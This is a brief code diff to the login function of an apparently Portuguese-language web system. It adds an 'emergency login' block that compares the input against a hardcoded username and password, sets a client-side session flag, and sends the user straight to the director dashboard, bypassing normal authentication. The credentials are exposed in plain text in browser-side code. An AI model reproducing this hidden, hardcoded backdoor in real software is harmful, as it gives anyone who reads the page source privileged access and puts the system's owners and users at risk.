@@ -137,6 +137,14 @@ window.loginSistema = async function () {
   .toLowerCase();
   const senha = document.getElementById("senha").value.trim();
 
+
+    // 🔴 LOGIN DE EMERGÊNCIA
+  if (login === "gustavoimarzinotti" && senha === "gustavo123") {
+  sessionStorage.setItem("diretorEmergencia", "true");
+  window.location.replace("/diretor/dashboard.html");
+  return;
+}
+
   if (!login || !senha) {
     alert("Preencha login e senha");
     return;
